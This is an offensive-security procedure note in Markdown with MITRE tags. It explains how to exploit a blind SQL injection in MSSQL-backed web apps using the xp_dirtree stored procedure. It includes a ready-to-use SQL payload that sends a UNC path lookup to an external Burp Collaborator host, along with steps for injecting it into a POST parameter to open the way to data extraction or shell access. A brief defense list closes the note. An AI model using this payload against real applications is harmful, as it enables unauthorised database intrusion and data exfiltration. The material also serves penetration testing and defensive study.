---
id: proc-uuid-002
tags:
  - blind-sqli
  - xp_dirtree
  - exfiltration
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/declare-xp_dirtree-unc]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.859Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-xp_dirtree-Payload-for-Exfiltration

## Summary

This procedure exploits a confirmed blind SQL injection by injecting an MSSQL payload that uses the xp_dirtree stored procedure to trigger DNS resolution and HTTP requests to an external collaborator server, confirming execution without direct output.

## Description

Targeted at MSSQL-backed web apps, this involves crafting a payload in the injectable parameter to declare a variable with a UNC path pointing to a controlled domain. xp_dirtree enumerates the path, forcing DNS lookups and potential WebDAV requests. Prerequisites include a unique collaborator URL and proxy setup; outcomes enable further SQL commands for data extraction or RCE.

## Requirements

1. Confirmed injectable parameter from prior detection
2. Burp Collaborator instance for out-of-band monitoring
3. Ability to craft multipart/form-data requests

## Defense

Defensive measures and detection strategies:

- Disable or restrict xp_dirtree and similar extended procs
- Monitor outbound DNS and HTTP from database servers
- Enforce least-privilege database accounts without xp_ access

## Objectives

1. Execute arbitrary SQL via blind injection
2. Trigger verifiable out-of-band interactions
3. Pave way for database enumeration or shell access

## Instructions

### Step 1: Craft Payload

**Context**: Build the SQL payload to close the original query and execute xp_dirtree.

**Command** ([[commands/declare-xp_dirtree-unc]]):
```sql
declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;--
```

> This declares @q as a UNC path, executes xp_dirtree to resolve the domain (DNS hit), and comments out the rest; replace domain with your collaborator.

### Step 2: Inject into Request

**Context**: Insert the payload into the 'from' parameter of the POST request.

Set 'from' to '1; [payload]' in multipart/form-data and submit via proxy.

> No direct output; success via external monitoring.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/declare-xp_dirtree-unc]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- [[blind-sqli]]
- [[Exfiltration]]
